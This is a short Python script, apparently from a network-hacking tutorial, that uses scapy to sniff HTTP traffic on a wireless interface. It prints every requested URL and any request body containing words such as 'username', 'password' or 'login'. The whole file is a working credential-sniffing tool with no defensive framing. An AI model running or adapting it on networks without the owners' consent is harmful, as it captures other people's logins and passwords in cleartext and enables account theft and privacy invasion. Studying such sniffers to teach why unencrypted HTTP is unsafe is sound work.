#!/usr/bin/env python
import scapy.all as scapy
from scapy_http import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet)

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print("HTTP Request >> " + url)

        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username", "password", "user", "login", "email"]
            for keyword in keywords:
                if keyword in load:
                    print("\n\nPossible username/password >>" + load + "\n\n")
                    break
sniff("wlo1")
